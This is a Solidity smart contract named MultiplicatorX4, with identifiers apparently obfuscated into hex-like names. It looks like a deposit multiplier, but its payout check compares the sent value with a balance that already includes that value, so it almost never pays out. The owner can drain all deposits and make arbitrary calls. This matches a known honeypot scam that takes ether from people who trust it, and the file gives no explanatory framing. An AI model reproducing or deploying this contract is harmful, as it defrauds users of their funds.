pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0xdeadba()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xf1e165,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xf1e165.call.value(msg.value)(data);
    }

    function _0x725f81(address _0xf1e165)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0xf1e165.transfer(this.balance+msg.value);
        }
    }
}